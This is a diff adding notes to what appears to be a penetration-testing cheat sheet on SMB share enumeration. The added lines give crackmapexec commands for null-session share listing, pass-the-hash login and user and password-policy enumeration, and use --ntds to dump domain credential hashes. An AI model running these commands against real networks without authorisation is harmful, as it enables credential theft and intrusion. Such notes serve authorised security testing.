@@ -105,3 +105,16 @@ groups.xml, scheduledtasks.xml, services.xml can contain sensitive information s
 
 smbclient \\\\<IP>\\<directory> -U 'domain\user'
 smbclient \\\\<IP> -U 'domain\user'
+
+SMB Shares
+During penetration test, SMB shares are one of the greatest way to gather information about target.
+There can be files that might contain sensitive information.
+There can be NULL SESSION situations.
+NULL SESSION : crackmapexec -u '' -p '' --shares <CIDR>
+
+Crackmapexec
+crackmapexec <CIDR> -u <user> -p <password> -d <domain> --uac
+crackmapexec <CIDR> -u <user> -p <password> --local-auth
+crackmapexec <CIDR> -u <user> -H <LM:NT>
+crackmapexec <CIDR> -u <user> -p <password> -d <domain> --users | --groups | --pass-pol
+crackmapexec <CIDR> -u <user> -p <password> -d <domain> --ntds
